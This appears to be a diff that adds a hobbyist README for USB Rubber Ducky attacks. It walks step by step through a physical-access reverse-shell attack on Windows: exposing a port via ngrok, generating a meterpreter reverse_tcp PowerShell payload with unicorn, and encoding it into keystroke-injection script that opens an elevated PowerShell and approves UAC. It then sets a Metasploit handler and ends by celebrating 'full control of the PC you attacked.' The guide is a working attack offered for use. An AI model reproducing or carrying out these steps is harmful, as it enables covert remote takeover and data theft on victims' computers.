@@ -1,0 +1,46 @@
+HI. i made a small list of some payloads for the usb rubber ducky.some of this payloads i made my own!
+
+i have made a reverse shell payload that you can access over internet outside local ip
+
+it will be soon released!
+
+requriements
+1. first make a free account on ngrok.com
+2. https://ngrok.com/download choose the linux download
+3. type in terminal unzip /path/to/ngrok.zip
+4. ./ngrok authtoken <your_auth_token>
+5. ./ngrok tcp 8080
+6. **********************************************
+7. now we need to install unicorn 
+8. git clone https://github.com/trustedsec/unicorn
+9. cd unicorn/
+10. ./unicorn.py windows/meterpreter/reverse_tcp (your ip address) (port)
+11. replace the ip address and port with your address 
+12. in ngrok terminal you should see EXAMPLE tcp://0.tcp.ngrok.io:18972 -> localhost:8080
+13. so it should look like this example ./unicorn.py windows/meterpreter/reverse_tcp 0.tcp.ngrok.io 18972
+14. when payload generated type in terminal ( cat powershell_attack.txt )
+15. and remove the (# actual unicron payload & AMSI bypass code - run)
+16. and put the code togheter into 1 line so when that done take that code and put it into https://ducktoolkit.com/encode 
+17. and type GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+STRING (your code)
+DELAY 1000
+ENTER
+( REMEBER THAT THE POWERSHELL_ATTACK.TXT CODE NEED TO BE IN 1 LINE THAT WHY YOU NEEDED TO PUT IT TOGHETER BEFORE!)
+paste in code and choose language and press ENCODE PAYLOAD
+18. you will get a reminder only using this for legal action just press OK and then you can see 2 files 1. duckycode.txt & 2.inject.bin drag the inject.bin into your rubber ducky
+19. done!
+20. now launch msfconsole and type following
+21. 1. use exploit/multi/handler
+22. 2. set payload windows/meterpreter/reverse/tcp
+23. 3. set LHOST 0.0.0.0 <--> LHOST NEEDS TO BE IN 0.0.0.0 YOU DO THAT TO
+24. 4. set LPORT 8080 <--> IF YOU STARTED NGROK ON 8080 LIKE I DID NGROK TCP 8080 THEN CHOOSE 8080 LIKE ME
+25. 5. exploit -j -z
+26. 6. DONE!
+*********************************************************************************************************************************************************************************
+         YOU KNOW GOT FULL CONTROL OF THE PC YOU ATTACKED WITH THE RUBBER DUCKY! ENJOY REMEBER THIS WAS MADE BY JACKSON MARCHNER!
+*********************************************************************************************************************************************************************************         
